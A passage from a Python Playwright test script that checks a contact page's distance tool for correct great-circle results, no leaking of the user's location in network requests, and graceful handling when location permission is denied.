        ctx = browser.new_context(viewport={"width": 1280, "height": 900}, geolocation={"latitude": la, "longitude": lo}, permissions=["geolocation"])
        pg = ctx.new_page(); sent = []
        pg.on("request", lambda r: sent.append(r.url))
        pg.goto(f"{BASE}/contact.html"); pg.wait_for_timeout(300)
        pg.click("#distance-btn"); wait_until(pg, "document.querySelector('#distance-result').textContent.includes('about')", 5000)
        txt = pg.inner_text("#distance-result"); exp = haversine(la, lo, float(loc['lat']), float(loc['lng']))
        mm = re.search(r"about ([\d.]+) (km|m) ", txt)
        got = (float(mm.group(1)) / (1000 if mm.group(2) == "m" else 1)) if mm else None
        check(f"distance tool ({label}) matches the great-circle distance", got is not None and abs(got - exp) <= max(0.06, exp * 0.01), f"shown '{txt}' expected {exp:.2f} km")
        others = [u_ for u_ in sent if "google.com/maps" not in u_]  # the map embed legitimately contains the office pin
        check(f"distance tool ({label}) never sends the position anywhere", not any(str(la)[:6] in u_ and str(lo)[:6] in u_ for u_ in others), str(others[:3]))
        check(f"distance tool ({label}) re-enables its button", not pg.is_disabled("#distance-btn"))
        ctx.close()
    ctx, pg = new_page()  # no geolocation permission granted
    pg.goto(f"{BASE}/contact.html"); pg.wait_for_timeout(250)
    pg.click("#distance-btn"); wait_until(pg, "document.querySelector('#distance-result').textContent.length > 25 && !document.querySelector('#distance-btn').disabled", 15000)
    check("denied or unavailable location shows a helpful message and the button recovers", ("permission" in pg.inner_text("#distance-result").lower() or "could not" in pg.inner_text("#distance-result").lower() or "too long" in pg.inner_text("#distance-result").lower()) and not pg.is_disabled("#distance-btn"), pg.inner_text("#distance-result"))
    ctx.close()

    browser.close()
srv.shutdown()
print(f"\n{len(failures)} failure(s)")
sys.exit(1 if failures else 0)
